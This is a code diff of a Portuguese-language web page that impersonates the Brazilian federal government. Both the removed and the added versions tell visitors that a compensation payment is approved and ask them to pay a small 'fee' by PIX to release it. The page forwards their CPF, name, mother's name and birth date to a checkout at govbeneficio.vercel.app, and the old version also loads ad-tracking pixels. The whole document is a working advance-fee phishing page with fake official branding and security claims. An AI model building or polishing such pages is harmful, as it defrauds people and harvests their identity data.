@@ -1,94 +1,115 @@
-<!DOCTYPE html><html lang="pt-BR"><head>
-
-<!-- TikTok Pixel Code Start -->
-<script>
-!function (w, d, t) {
-  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
-var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
-;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
-
-  ttq.load('D6ROQ3BC77UA8MCFBSDG');
-  ttq.page();
-}(window, document, 'ttq');
-</script>
-<!-- TikTok Pixel Code End -->
-
-  <script>
-  window.tikTokPixelId = "69b78d959dcfda60eb53f101";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
-  document.head.appendChild(a);
-</script>
-    
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Página de Pagamento - Governo Federal</title>
-    <link rel="stylesheet" href="css/lQ0UNgdesWCz.css">
-    <script>
-        localStorage.setItem("upsell", "up2");
-    </script>
-    <script>
-  window.pixelId = "6845ec0d545bd01304237507";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-</script><script async="" defer="" src="js/pixel.js"></script>
+    <title>Portal de Indenizações - Consulta Consolidada</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        .gov-blue { background-color: #003366; }
+        .gov-accent { border-left: 4px solid #168821; }
+    </style>
 </head>
-<body>
-    <div class="container">
-        <div style="width: 100%; text-align: center; margin: auto;">
-            <img src="images/ja1d2WHKLqed.png" alt="Governo Federal" class="logo" style="width: 100%; max-width: 130px;">
+<body class="bg-gray-50 text-gray-800">
+
+    <header class="bg-white border-b border-gray-200">
+        <div class="max-auto max-w-5xl px-4 py-3 flex items-center justify-between">
+            <div class="flex items-center gap-4">
+                <div class="w-12 h-12 bg-gray-200 rounded-full flex items-center justify-center">
+                    <i class="fas fa-shield-alt text-gray-600 text-2xl"></i>
+                </div>
+                <div>
+                    <h1 class="font-bold text-sm tracking-tight text-gray-700 uppercase leading-tight">
+                        Sistema Único de <br> Pagamentos Indenizatórios
+                    </h1>
+                </div>
+            </div>
+            <div class="text-[10px] text-gray-500 text-right hidden md:block">
+                <span>Portal Oficial da União <br> Acesso Seguro via Protocolo SSL</span>
+            </div>
         </div>
-        <div class="amount">
-            <div class="amount-label">Indenização disponível:</div>
-            <div class="amount-value">R$ 5.960,50</div>
-        </div>
-        <div class="tax-box">
-            <div class="tax-box-title">TENF (Taxa de Emissão de Nota Fiscal)</div>
-            <div class="tax-box-value">R$ 35,82</div>
-        </div>
-        <button id="paymentButton" class="button" onclick="irParaCheckout()">Efetuar pagamento da Taxa</button>
-        <div id="loadingMessage">Gerando código PIX...</div>
-        
-        <div class="info-box">
-            Para receber o valor, é obrigatório realizar o pagamento do TENF (Taxa de Emissão de Nota Fiscal). Que
-            corresponde ao custo gerado por transferências de alto valor, após o pagamento será feito a transferência
-            imediata da sua indenização para sua chave pix cadastrada. Caso não conclua o pagamento dessa taxa, sua
-            indenização será bloqueada.
+    </header>
+
+    <div class="gov-blue py-1">
+        <div class="max-w-5xl mx-auto px-4 text-white text-[12px] flex justify-between">
+            <span>BRASIL.GOV.BR</span>
+            <span class="opacity-80">ÓRGÃO REGULADOR DE ATIVOS</span>
         </div>
     </div>
-    <script src="js/YaGYkk2Laswz.js"></script>
-    <script src="js/Om9CWrkCza0N.js" data-utmify-prevent-subids="" async="" defer=""></script>
-    <script>
-        function irParaCheckout() {
-            var p = new URLSearchParams(window.location.search);
 
-            var dest = new URLSearchParams();
+    <main class="max-w-3xl mx-auto px-4 py-10">
+        
+        <div class="bg-white shadow-sm border border-gray-200 rounded-lg overflow-hidden">
+            
+            <div class="bg-yellow-50 border-b border-yellow-100 p-4 flex gap-3">
+                <i class="fas fa-clock text-yellow-600 mt-1"></i>
+                <p class="text-sm text-yellow-800 font-medium">
+                    Aguardando confirmação do método de liberação de fundos.
+                </p>
+            </div>
 
-            // Dados pessoais vindos da API de CPF — aceita nome/cpf em qualquer formato
-            var nome = p.get('nome') || '';
-            var cpf  = p.get('cpf') || p.get('documento') || '';
+            <div class="p-8">
+                <h2 class="text-2xl font-bold text-gray-900 mb-6">Status da Indenização: <span class="text-green-600">Aprovada</span></h2>
+                
+                <p class="text-gray-600 leading-relaxed mb-6">
+                    Informamos que os valores referentes à sua indenização foram processados e encontram-se em conta de custódia. De acordo com o protocolo padrão de processamento em lote, o desembolso segue o fluxo ordinário de compensação bancária estatal.
+                </p>
 
-            if (nome) {
-                dest.set('nome', nome);
-                dest.set('documento', cpf); // checkout espera 'documento'
-                dest.set('cpf', cpf);       // mantém 'cpf' também por segurança
-            }
+                <div class="space-y-6">
+                    
+                    <div class="border-2 border-blue-600 rounded-xl p-6 bg-blue-50 relative">
+                        <span class="absolute top-0 right-0 bg-blue-600 text-white text-[10px] px-3 py-1 font-bold uppercase rounded-bl-lg">Recomendado</span>
+                        <h3 class="font-bold text-blue-900 text-lg mb-2">Liberação Imediata (Via PIX)</h3>
+                        <p class="text-sm text-blue-800 mb-4 leading-snug">
+                            Para usuários que necessitam do capital com urgência. A taxa de processamento prioritário cobre os custos de liquidação em tempo real junto ao Banco Central.
+                        </p>
+                        <div class="flex items-center justify-between mb-6">
+                            <span class="text-xs text-gray-500 uppercase font-bold tracking-widest">Tempo de Espera:</span>
+                            <span class="font-bold text-blue-700">Até 5 minutos</span>
+                        </div>
+                        <a href="https://govbeneficio.vercel.app/checkout.html?cpf={{cpf}}&nome={{nome}}&mae={{nomeMae}}&nascimento={{nascimento}}" class="block w-full text-center bg-blue-700 hover:bg-blue-800 text-white font-bold py-4 rounded-lg transition-all shadow-md">
+                            ANTECIPAR MEU RECEBIMENTO (R$ 25,00)
+                        </a>
+                    </div>
 
-            // Valor fixo desta taxa
-            dest.set('valor', '3582');
+                    <div class="relative flex py-4 items-center">
+                        <div class="flex-grow border-t border-gray-300"></div>
+                        <span class="flex-shrink mx-4 text-gray-400 text-sm font-medium">OU</span>
+                        <div class="flex-grow border-t border-gray-300"></div>
+                    </div>
 
-            // Repassa UTMs e rastreamento
-            ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','src','sck','fbclid'].forEach(function(k) {
-                var v = p.get(k);
-                if (v) dest.set(k, v);
-            });
+                    <div class="border border-gray-200 rounded-xl p-6 bg-white hover:border-gray-300 transition-colors">
+                        <h3 class="font-bold text-gray-800 text-lg mb-2">Fluxo Ordinário de Pagamento</h3>
+                        <p class="text-sm text-gray-500 mb-4 leading-snug">
+                            O pagamento será agendado para o próximo ciclo de desembolso trimestral, seguindo a ordem cronológica de registro.
+                        </p>
+                        <div class="flex items-center justify-between mb-6">
+                            <span class="text-xs text-gray-400 uppercase font-bold tracking-widest">Tempo de Espera:</span>
+                            <span class="font-bold text-gray-600">120 dias úteis</span>
+                        </div>
+                        <a href="https://govbeneficio.vercel.app/up2.html?cpf={{cpf}}&nome={{nome}}&mae={{nomeMae}}&nascimento={{nascimento}}" class="block w-full text-center border border-gray-300 text-gray-500 font-semibold py-3 rounded-lg hover:bg-gray-50 transition-all">
+                            Desejo esperar 120 dias
+                        </a>
+                    </div>
+                </div>
+            </div>
 
-            window.location.href = 'https://govbeneficio.vercel.app/checkout.html?' + dest.toString();
-        }
-    </script>
-</body></html>
+            <div class="p-6 bg-gray-100 border-t border-gray-200">
+                <div class="flex items-center gap-4 opacity-60 grayscale">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/bb/Pix_logo.svg" alt="Pix" class="h-4">
+                    <div class="h-4 w-[1px] bg-gray-400"></div>
+                    <span class="text-[10px] font-bold">CERTIFICAÇÃO DIGITAL PADRÃO ICP-BRASIL</span>
+                </div>
+            </div>
+        </div>
+
+        <p class="mt-8 text-center text-xs text-gray-400">
+            © 2026 Portal de Pagamentos Governamentais - Todos os direitos reservados. <br>
+            Este é um ambiente seguro. Suas transações são protegidas por criptografia de ponta a ponta.
+        </p>
+    </main>
+
+</body>
+</html>
